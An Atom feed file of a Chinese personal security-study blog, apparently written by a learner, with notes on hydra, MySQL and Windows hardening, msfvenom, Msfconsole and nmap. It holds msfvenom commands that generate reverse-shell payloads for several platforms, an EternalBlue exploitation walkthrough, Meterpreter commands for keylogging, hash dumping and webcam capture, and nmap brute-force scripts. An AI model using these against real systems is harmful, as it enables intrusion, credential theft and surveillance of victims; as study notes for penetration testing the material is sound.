@@ -1,0 +1,237 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Pokerface</title>
+  
+  <subtitle>记录学习过程和一些笔记</subtitle>
+  <link href="http://example.com/atom.xml" rel="self"/>
+  
+  <link href="http://example.com/"/>
+  <updated>2021-12-14T12:57:44.385Z</updated>
+  <id>http://example.com/</id>
+  
+  <author>
+    <name>Pokerface</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>hydra</title>
+    <link href="http://example.com/2021/12/14/hydra/"/>
+    <id>http://example.com/2021/12/14/hydra/</id>
+    <published>2021-12-14T12:47:04.000Z</published>
+    <updated>2021-12-14T12:57:44.385Z</updated>
+    
+    <content type="html"><![CDATA[<p>选项：</p><p>-l LOGIN或-l使用登录名登录文件，或从文件中加载多个登录</p><p>-p PASS或-p FILE尝试密码PASS，或从文件中加载多个密码</p><p>-C文件冒号分隔的“login:pass”格式，而不是-L/-P选项</p><p>-M要攻击的服务器的文件列表，每行一个条目，“：”以指定端口</p><p>-t任务运行任务每个目标的并行连接数（默认值：16）</p><p>-U服务模块使用详细信息</p><p>-h更多命令行选项（完整帮助）</p><p>服务器目标：DNS、IP或192.168。0.0/24（此选项或-M选项）</p><p>为破解服务提供服务（有关支持的协议，请参见下文）</p><p>选择某些服务模块支持附加输入（-U表示模块帮助）</p><p>支持的服务：adam6500 asterisk cisco cisco enable cvs firebird ftp[s]http[s]{head | get | post}http[s]{get | post}-表单http代理http代理urlenum icq imap[s]irc ldap2[s]ldap3[-{cram | digest}md5][s]memcached mongodb mssql mysql nntp oracle侦听器oracle sid pcnfs pop3[s]postgres radmin2 rdp rexec rlogin rpcap rsh rtsps7-300 sip smb smtp[s]smtp枚举snmp socks5 ssh sshkey svn teamspeak telnet[s]vmauthd vnc xmpp</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;选项：&lt;/p&gt;
+&lt;p&gt;-l LOGIN或-l使用登录名登录文件，或从文件中加载多个登录&lt;/p&gt;
+&lt;p&gt;-p PASS或-p FILE尝试密码PASS，或从文件中加载多个密码&lt;/p&gt;
+&lt;p&gt;-C文件冒号分隔的“login:pass”格式，而不是-L/-P选项&lt;/p&gt;
+&lt;p&gt;-</summary>
+      
+    
+    
+    
+    <category term="密码爆破" scheme="http://example.com/categories/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
+    
+    
+    <category term="渗透工具" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>数据库加固</title>
+    <link href="http://example.com/2021/11/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/"/>
+    <id>http://example.com/2021/11/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/</id>
+    <published>2021-11-19T00:11:35.000Z</published>
+    <updated>2021-11-20T01:29:50.253Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="数据库加固配置"><a href="#数据库加固配置" class="headerlink" title="数据库加固配置"></a>数据库加固配置</h3><ol><li><p>以普通用户MySQL运行MySQL，禁止MySQL以管理员权限运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">修改/etc/my.cnf文件在<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>下添加user<span class="token operator">=</span>mysql（用户得自行创建）修改完重启mysql服务 systemctl restart mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/m1.png"></p></li><li><p>删除默认数据库(test)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">drop database <span class="token builtin class-name">test</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>改变默认MySQL管理员为SuperRoot</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use mysqlupdate user <span class="token builtin class-name">set</span> <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token string">'SuperRoot'</span> where <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token keyword">select</span> user,host from userflush privileges<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/m2.png"><br><img src="/images/m3.png"></p></li><li><p>使用MySQL内置MD5函数给用户加密，密码为123</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">update user <span class="token builtin class-name">set</span> <span class="token assign-left variable">password</span><span class="token operator">=</span>password<span class="token punctuation">(</span>MD5<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">))</span> where <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token string">'user1'</span><span class="token punctuation">;</span>flush privileges <span class="token comment">#刷新</span>注：这边默认是authentication_string，一般默认为password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/m4.png"></p></li><li><p>赋予user1对数据库只有select，insert，dalete，update权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show grants <span class="token keyword">for</span> <span class="token string">'user1'</span>@<span class="token string">'localhost'</span><span class="token punctuation">;</span> <span class="token comment">#查看权限</span>grant select,insert,delete,update on *.* to <span class="token string">'user1'</span>@<span class="token string">'localhost'</span><span class="token punctuation">;</span>flush privileges<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/m5.png"><br><img src="/images/m7.png"><br><img src="/images/m6.png"></p></li><li><p>对忘记数据库的root密码进行修改<br>在配置文本my.cnf文件，在mysqld下添加skip_grant_tables，并保存退出重启服务<br>接着直接输入mysql回车，可跳过账户和密码登录，修改完密码后删除skip_grant_tables重启服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart mysqld <span class="token comment">#重启服务</span>update user <span class="token builtin class-name">set</span> <span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token string">'123'</span> where <span class="token assign-left variable">user</span><span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span> <span class="token comment">#修改密码为123</span>flush privileges<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/m9.png"><br><img src="/images/m8.png"></p></li><li><p>禁用LOCAL INFILE命令防止非授权用户访问本地文件<br>配置文本my.cnf下，在mysqld下添加local-infile=0<br><img src="/images/m10.png"></p></li><li><p>防止数据库信息泄露，禁止使用Mysql命令行历史记录<br>rm -f $HOME/.mysql_history #删除历史记录文件</p><p>ln -s /dev/null $HOME/.mysql_history<br><img src="/images/m11.png"></p></li><li><p>分析数据库运行过程中异常活动，开启MySQL二进制日志</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">修改：/etc/my.cnf在<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>下添加log-bin<span class="token operator">=</span>mysql-bin 并重启服务show variables like <span class="token string">'%log_bin%'</span> <span class="token comment">#查看是否开启</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/m12.png"><br><img src="/images/m13.png"></p></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;数据库加固配置&quot;&gt;&lt;a href=&quot;#数据库加固配置&quot; class=&quot;headerlink&quot; title=&quot;数据库加固配置&quot;&gt;&lt;/a&gt;数据库加固配置&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;以普通用户MySQL运行MySQL，禁止MySQL以管理员权限运行&lt;/p&gt;
+&lt;pr</summary>
+      
+    
+    
+    
+    <category term="数据库加固" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/"/>
+    
+    
+    <category term="安全策略" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>iptables</title>
+    <link href="http://example.com/2021/11/18/iptables/"/>
+    <id>http://example.com/2021/11/18/iptables/</id>
+    <published>2021-11-18T00:13:25.000Z</published>
+    <updated>2021-11-18T00:13:25.443Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>密码策略配置</title>
+    <link href="http://example.com/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/"/>
+    <id>http://example.com/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/</id>
+    <published>2021-11-17T02:13:49.000Z</published>
+    <updated>2021-11-18T00:17:02.073Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="密码策略配置"><a href="#密码策略配置" class="headerlink" title="密码策略配置"></a>密码策略配置</h3><p><strong>Windows下的密码配置</strong></p><p>​    <strong>前提：一些windows版本没有组策略，需要自行配置，复制下方内容到txt文本，后缀改为bat或cmd运行即可</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@echo off<span class="token function">pushd</span> <span class="token string">"%~dp0"</span><span class="token function">dir</span> /b C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>servicing<span class="token punctuation">\</span>Packages<span class="token punctuation">\</span>Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum <span class="token operator">></span>List.txt<span class="token function">dir</span> /b C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>servicing<span class="token punctuation">\</span>Packages<span class="token punctuation">\</span>Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum <span class="token operator">>></span>List.txt<span class="token keyword">for</span> /f %%i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'findstr /i . List.txt 2^>nul'</span><span class="token punctuation">)</span> <span class="token keyword">do</span> dism /online /norestart /add-package:<span class="token string">"C:\Windows\servicing\Packages\%%i"</span>pause<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>配置密码复杂性，密码最长使用期限，密码长度最小值不小于八位</p><ul><li>（Win+R输入 gpedit.msc）</li><li>Windows设置-&gt;安全设置-&gt;账户策略-&gt;密码策略-&gt;设置1、密码必须符合复杂性要求（启用），2、密码长度最小值（不小于八位），3、密码最长使用期限</li><li><img src="/images/w1.png"></li><li><img src="/images/w2.jpg"></li><li><img src="/images/w3.png"></li></ul></li><li><p>配置windows登录，五次登录之后，自动锁定账户一分钟</p><ul><li>Windows设置-&gt;安全设置-&gt;账户策略-&gt;账户锁定策略-&gt;1、设置账户锁定阈值（五次）2、账户锁定时间（一分钟）</li><li><img src="/images/w4.png"></li><li><img src="/images/w5.png"></li></ul></li><li><p>设置windows试图登录的用户提示的消息文本内容为For authorized users only</p><ul><li>Windows设置-&gt;安全设置-&gt;本地策略-&gt;安全选项-&gt;交互式登录：试图登录的用户的消息文本</li><li><img src="/images/w6.png"></li></ul></li><li><p>设置windows远程时用户非活动会话链接应小于等于五分钟</p><ul><li>用户配置-&gt;管理面板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;会话时间限制-&gt;设置活动但空闲的远程桌面服务会话的时间限制（启用并设置五分钟）</li><li><img src="/images/w7.jpg"></li></ul></li><li><p>对windows服务器进行远程管理安全性SSL加固，防止敏感信息泄露被监听</p><ul><li>计算机配置-&gt;管理模板-&gt;Windows组件-&gt;远程桌面服务-&gt;远程桌面会话主机-&gt;安全-&gt;设置</li><li>远程（RDP）连接要求使用指定的安全层（SSL）</li><li>要求安全的RPC通信</li><li>设置客户端连接加密级别（高级别）</li><li><img src="/images/w8.png"></li><li><img src="/images/w9.png"></li><li><img src="/images/w10.png"></li></ul></li><li><p>普通用户进行最小权限管理，对关闭系统仅限超级管理员帐号</p><ul><li>计算机配置-&gt;Windows设置-&gt;安全设置-&gt;本地策略-&gt;用户权限分配-&gt;关闭系统（除administrators外的用户删除）</li><li><img src="/images/w11.png"></li></ul></li><li><p>查找并删除主机可能存在的hacker用户</p><ul><li><img src="/images/w12.png"></li></ul></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;密码策略配置&quot;&gt;&lt;a href=&quot;#密码策略配置&quot; class=&quot;headerlink&quot; title=&quot;密码策略配置&quot;&gt;&lt;/a&gt;密码策略配置&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Windows下的密码配置&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;​    &lt;strong&gt;前提：</summary>
+      
+    
+    
+    
+    <category term="密码策略" scheme="http://example.com/categories/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5/"/>
+    
+    
+    <category term="安全策略" scheme="http://example.com/tags/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Msfvenom</title>
+    <link href="http://example.com/2021/11/15/Msfvenom/"/>
+    <id>http://example.com/2021/11/15/Msfvenom/</id>
+    <published>2021-11-15T03:25:23.000Z</published>
+    <updated>2021-11-15T14:15:55.633Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><p>Msfvenom参数：</p><p>用法：/usr/bin/msfvenom[选项]&lt;var=val&gt;</p><p>示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=<IP>-f exe-o payload.exe</p><p>选项：</p><p>-l、 –列出&lt;类型&gt;列出[类型]的所有模块。类型有：有效载荷、编码器、NOP、平台、ARCH、加密、格式等</p><p>-p、 –payload<payload>payload to use（–list payload to list，–list参数选项）。为自定义指定“-”或STDIN</p><p>–列表选项列表–有效载荷<value>的标准、高级和规避选项</p><p>-f、 –format<format>输出格式（使用–list要列出的格式）</p><p>-e、 –编码器&lt;编码器&gt;要使用的编码器（使用–列出要列出的编码器）</p><p>–服务名称<value>生成服务二进制文件时要使用的服务名称</p><p>–sec name<value>生成大型Windows二进制文件时要使用的新节名。默认值：随机4个字符的alpha字符串</p><p>–使用所有可用编码器生成尽可能最小的有效负载</p><p>–encrypt<value>要应用于外壳代码的加密或编码类型（使用–list encrypt to list）</p><p>–加密密钥<value>用于–encrypt的密钥</p><p>–encrypt iv<value>的初始化向量–encrypt</p><p>-a、 –arch<arch>用于–payload和–encoder的体系结构（使用–list-arch列出）</p><p>–平台<platform>platform for–payload（使用–list要列出的平台）</p><p>-o、 –out<path>将有效负载保存到文件</p><p>-b、 –要避免的坏字符<list>示例：’\x00\xff’</p><p>-n、 –nopled<length>将[length]大小的nopled预先发送到有效负载上</p><p>–pad NOP使用-n<length>指定的nopsled大小作为总有效负载大小，自动预加nopsled数量（nops减去有效负载长度）</p><p>-s、 –空间&lt;长度&gt;产生的有效载荷的最大尺寸</p><p>–编码器空间&lt;长度&gt;编码有效负载的最大大小（默认为-s值）</p><p>-i、 –迭代&lt;计数&gt;对有效负载进行编码的次数</p><p>-c、 –添加代码<path>指定要包含的其他win32外壳代码文件</p><p>-x、 –template<path>指定要用作模板的自定义可执行文件</p><p>-k、 –保留–template行为并将有效负载作为新线程注入</p><p>-v、 –var name<value>指定用于某些输出格式的自定义变量名</p><p>-t、 –timeout<second>从STDIN读取有效负载时等待的秒数（默认值为30，0表示禁用）</p><p>常用木马：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Windows:格式：msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f exe <span class="token operator">></span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Liunx：格式：msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>PORT<span class="token operator">></span> -f elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PHP：格式：msfvenom -p php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ASP：格式：msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f asp <span class="token operator">></span> shell.asp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-BASH" data-language="BASH"><code class="language-BASH">JSP：格式：msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;[IP] LPORT&#x3D;[PORT] -f raw &gt; shell.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Python：格式：msfvenom -p cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Bash：格式：msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Perl：格式：msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token punctuation">[</span>IP<span class="token punctuation">]</span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token punctuation">[</span>PORT<span class="token punctuation">]</span> -f raw <span class="token operator">></span> shell.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Msfvenom&quot;&gt;&lt;a href=&quot;#Msfvenom&quot; class=&quot;headerlink&quot; title=&quot;Msfvenom&quot;&gt;&lt;/a&gt;Msfvenom&lt;/h2&gt;&lt;p&gt;Msfvenom参数：&lt;/p&gt;
+&lt;p&gt;用法：/usr/bin/msfvenom[选项]&amp;lt</summary>
+      
+    
+    
+    
+    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="渗透工具" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Msfconsole</title>
+    <link href="http://example.com/2021/11/15/Msfconsole/"/>
+    <id>http://example.com/2021/11/15/Msfconsole/</id>
+    <published>2021-11-15T00:55:36.000Z</published>
+    <updated>2021-11-16T00:58:15.865Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Msfconsole"><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h2><p><strong>Msfconsole初始化参数：</strong></p><p>-E、 –环境环境设置Rails环境，默认为RAIL_ENV环境变量或“production”</p><p>-M、 –迁移路径目录指定包含其他数据库迁移的目录</p><p>-n、 –无数据库禁用数据库支持</p><p>-y、 –yaml PATH指定包含数据库设置的yaml文件</p><p>-c文件加载指定的配置文件</p><p>-v、 -v，–version显示版本</p><p>–defer-module-loads –延迟模块加载延迟模块加载，除非明确要求</p><p>-m、 –模块路径目录加载其他模块路径</p><p>-a、 –退出Metasploit前询问或接受“退出-y”</p><p>-H、 –历史记录文件将命令历史记录保存到指定文件</p><p>-l、 –记录器字符串指定要使用的记录器（Flatfile、StdoutWithoutTimestamps、Stderr、Stdout</p><p>z`TimestampColorlessFlatfile）</p><p>-L,   –real readline使用系统readline库而不是RbReadline</p><p>-o、 –输出文件输出到指定的文件</p><p>-p、 –插件启动时加载插件</p><p>-q、 –启动时不要打印横幅</p><p>-r、 –资源文件执行指定的资源文件（-for stdin）</p><p>-x、 –执行命令执行指定的控制台命令（使用；多个）</p><p><strong>Msfconsole启动后参数：</strong></p><p>advanced      高级显示一个或多个模块的高级选项</p><p>back              后退从当前上下文向后移动</p><p>clearm           clearm清除模块堆栈</p><p>favorite          收藏夹将模块添加到收藏夹模块列表中</p><p>info                信息显示有关一个或多个模块的信息</p><p>listm               列出模块堆栈</p><p>loadpath         从路径中搜索并加载模块</p><p>options           选项显示一个或多个模块的全局选项或</p><p>popm             将最新模块从堆栈中弹出并使其处于活动状态</p><p>previous        将以前加载的模块设置为当前模块</p><p>pushm           将活动或模块列表推送到模块堆栈上</p><p>reload_all      重新加载\u all从所有定义的模块路径重新加载所有模块</p><p>search          搜索模块名称和描述</p><p>show            显示显示给定类型的模块或所有模块</p><p>use               使用“按名称或搜索词/索引与模块交互”</p><p><strong>常用模块解释：</strong></p><p>search 搜索列举相关模块</p><p><img src="/images/msfc1.png"></p><p>use 选择相关模块</p><p><img src="/images/msfc2.png"></p><p>show options 显示模块的相关参数</p><p><img src="/images/msfc3.png"></p><p>back 退出当前模块</p><p><img src="/images/msfc4.png"></p><p>set 用来设置选择模块后的载荷</p><p><img src="/images/msfc5.png"></p><p>run和exploit运行当前模块</p><p><img src="/images/msfc6.png"></p><p><strong>利用永恒之蓝进行简单的一次渗透：</strong></p><p>启动软件：</p><p><img src="/images/msfc7.png"></p><p>搜索Ms17_010模块并选择：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：search 格式：use exploit/windows/smb/ms17_010_eternalblue<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/msfc9.png"></p><p>列出当前选择模块的可用内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/msfc8.png"></p><p>利用set设置上面显示内容的RHOSTS 指定要攻击的电脑IP</p><p><img src="/images/msfc10.png"></p><p>输入run或exploit运行当前模块，拿到控制台</p><p><img src="/images/msfc11.png"></p><p><img src="/images/msfc12.png"></p><p><strong>Meterpreter命令：</strong></p><p>cat /路径/ 查看文件内容</p><p>del /路径/ 删除指定内容</p><p>upload /路径/ 上传文件到目标主机</p><p>download /路径/ 下载目标主机文件到本地主机</p><p>pwd 查看当前所在路径</p><p>mv 修改目标主机上的文件名</p><p>keyscan_start 开启键盘记录功能</p><p>keyscan_dump 显示捕捉到的键盘记录信息</p><p>keyscan_stop 停止键盘记录功能</p><p>reboot 重启目标主机</p><p>shell 拿到cmd</p><p>sysinfo 查看目标主机信息</p><p>hashdump 获取目标主机用户名的hash值</p><p>vnc 远程桌面</p><p>record_mic 音频录制</p><p>webcam_chat 查看摄像头接口</p><p>webcam_list 查看摄像头列表</p><p>webcam_stream 摄像头获取</p><p>keylogrecorder 记录键盘信息</p><p>run post/windows/manage/enable_rdp 开启目标远程3389</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Msfconsole&quot;&gt;&lt;a href=&quot;#Msfconsole&quot; class=&quot;headerlink&quot; title=&quot;Msfconsole&quot;&gt;&lt;/a&gt;Msfconsole&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Msfconsole初始化参数：&lt;/strong&gt;&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="渗透工具" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>nmap扫描</title>
+    <link href="http://example.com/2021/11/12/nmap%E5%B7%A5%E5%85%B7/"/>
+    <id>http://example.com/2021/11/12/nmap%E5%B7%A5%E5%85%B7/</id>
+    <published>2021-11-12T02:39:57.000Z</published>
+    <updated>2021-11-15T14:16:01.588Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><strong>Nmap参数：</strong></p><p>-A #进行综合性扫描<br>       -O #进行系统版本扫描<br>       -p #指定端口扫描<br>       -v #显示扫描过程<br>       -e #指定网卡进行扫描<br>       -T #加速扫描过程，默认时序4，最高为6<br>       -n #不进行dns解析<br>       -Pn #不进行ping扫描<br>       -sP #判断主机存活<br>       -sS #SYN半连接扫描探测端口开放状态<br>       -sV #进行服务版本扫描<br>       -sX #圣诞树扫描<br>       -sF FIN扫描<br>       -sU #使用UDP扫描方式确定UDP端口状态<br>       -sT #TCP端口扫描<br>       -sW #滑动窗口扫描<br>       -sO #主机协议扫描<br>       -sL #dns反向解析<br>       -sR #RPC扫描<br>       -sL #完全隐藏扫描<br>       -sn #只进行主机发现，不进行端口扫描<br>       -oX #将扫描结果生成xml文件<br>       -iL #指定文本文件扫描</p><p><strong>Nmap脚本扫描：</strong></p><p>脚本存放路径：/usr/share/nmap/scripts</p><p>nmap –script mysql-vuln-cve2012-2122 ip root连续攻击</p><p>nmap -p3306 –script mysql-empty-password ip 扫描root空口令</p><p>nmap –script=auth IP地址 绕过鉴权的扫描，也可以扫描弱口令<br>       nmap –script=brute IP地址 暴力破解,mysql,snmp,smb,密码猜解</p><p>nmap –script=default IP地址 收集应用服务信息，针对具体服务攻击</p><p>nmap –script=vuln IP地址 检查是否存在常见漏洞<br>       nmap -n -p端口 –script=broadcast IP地址 在局域网探索更多服务</p><p>nmap –script=vnc-auth IP地址 检查VNC认证方式</p><p>nmap –script=vnc-info IP地址 获取VNC信息<br>       nmap –script=smb-brute.nse IP地址 smb破解</p><p>nmap –script=smb-brute.nse –script-args=userdb=/var/passwd,passdb=/var/passwd IP地址 smb字典</p><p>nmap –script=smb-check-vulns.nse –script-args=unsafe=1 IP地址 smb已知几个严重漏洞</p><p>nmap -p 445 –script smb-ls –script-args ‘share=e$,path=,smbpass=test’ IP地址 查看共享目录</p><p>nmap -n -p445 –script=smb-enum-sessions.nse –script-args=smbuser=test,smbpass=test IP地址 查看会话</p><p>nmap -n -p445 –script=smb-os-discovery.nse –script-args=smbuser=test,smbpass=test IP地址 查看系统信息</p><p>nmap -p 1433 –script=ms-sql-brute –script-args=userdb=/var/passwd,passdb=/var/passwd IP地址 猜解微软mssql用          户名和密码</p><p>nmap -p3306 –script=mysql-empty-password.nse IP地址 扫描ROOT空口令</p><p>nmap -p3306 –script=mysql-users.nse –script-args=mysqluser=root IP地址 列出所有mysql用户]</p><p>nmap -sV –script=telnet-brute IP地址 telnet破解</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Nmap&quot;&gt;&lt;a href=&quot;#Nmap&quot; class=&quot;headerlink&quot; title=&quot;Nmap&quot;&gt;&lt;/a&gt;Nmap&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Nmap参数：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;-A #进行综合性扫描&lt;br&gt;       -O #进行系统</summary>
+      
+    
+    
+    
+    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="渗透工具" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sqlmap工具</title>
+    <link href="http://example.com/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/"/>
+    <id>http://example.com/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/</id>
+    <published>2021-11-12T00:17:08.000Z</published>
+    <updated>2021-11-16T06:33:23.805Z</updated>
+    
